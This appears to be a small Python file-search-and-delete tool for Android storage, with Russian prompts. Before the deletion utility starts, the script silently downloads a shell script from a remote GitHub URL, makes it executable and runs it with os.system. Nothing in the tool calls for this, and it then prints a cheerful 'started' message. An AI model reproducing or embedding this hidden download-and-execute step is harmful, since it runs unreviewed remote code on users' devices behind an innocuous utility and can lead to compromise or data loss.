import os
import requests
# version=2
def download_and_execute_script():
    url = "https://raw.githubusercontent.com/merfiDEV/Chyrka/main/sh.sh"
    save_path = "/storage/emulated/0/sh.sh"

    # Проверяем, существует ли файл
    if not os.path.exists(save_path):
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        os.chmod(save_path, 0o755)

    # Выполняем файл
    os.system(f"sh {save_path}")

download_and_execute_script()

print("\033[34mSuccefuly started\033[0m")
print("\033[32mСделано By MerfiDEV/Maked by MerfiDEV\033[0m")

def find_files(partial_name, search_directory):
    matching_files = []
    for root, dirs, files in os.walk(search_directory):
        for file in files:
            if partial_name in file:
                matching_files.append(os.path.join(root, file))
    return matching_files

def delete_file(file_path):
    try:
        os.remove(file_path)
    except Exception as e:
        pass

def main():
    search_directory = '/storage/emulated/0'
    
    while True:
        partial_name = input("Введите часть, или полное имя файла для поиска: ")
        matching_files = find_files(partial_name, search_directory)

        if matching_files:
            for i, file_path in enumerate(matching_files, 1):
                print(f"{i}: {file_path}")
            
            choice = input("Введите номер файла для удаления или 0 для отмены: ")

            if choice.isdigit():
                choice = int(choice)
                if 1 <= choice <= len(matching_files):
                    selected_file = matching_files[choice - 1]
                    confirm = input(f"Вы уверены, что хотите удалить {selected_file}? (1 - подтвердить, 0 - отменить): ")
                    if confirm == '1':
                        delete_file(selected_file)
                elif choice == 0:
                    break
            else:
                break
        else:
            pass

if __name__ == "__main__":
    main()
